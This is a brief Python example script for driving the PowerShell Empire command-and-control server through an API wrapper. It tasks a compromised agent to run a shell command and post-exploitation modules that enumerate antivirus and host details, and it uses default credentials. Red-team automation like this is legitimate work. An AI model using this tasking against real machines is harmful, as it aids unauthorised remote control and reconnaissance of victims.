"""This is a sample technique script using EmpireAPIWrapper"""
import EmpireAPIWrapper


if __name__ == "__main__":
                                    # change to your IP/host & (token or credentials)
    API = EmpireAPIWrapper.empireAPI('empirec2', uname='empireadmin', passwd='Password123')
    AGENT = API.agents()
    AGENT_NAME = AGENT['agents'][0]['name']
    try:
        # shell command example
        DATA = {'Agent': AGENT_NAME, 'command': 'date'} # date is a rather slow command
        TASKID = API.agent_run_shell_cmd(AGENT_NAME, DATA)['taskID']
        print('new taskID = ' + str(TASKID))
        print(API.agent_get_results(AGENT_NAME, TASKID))

        # module execution Job example
        OPTIONS = {'Agent': AGENT_NAME} # ie. gather from module's "info"
        TASKID = API.module_exec('powershell/situational_awareness/host/antivirusproduct', \
                                OPTIONS)['taskID']
        print('new taskID = ' + str(TASKID))
        print(API.agent_get_results(AGENT_NAME, TASKID))

        # module exception example (needs admin rights but session is non-elevated)
        API.module_exec('powershell/situational_awareness/host/computerdetails', OPTIONS)

    except Exception as e:
        print('Error: ' + str(e))
    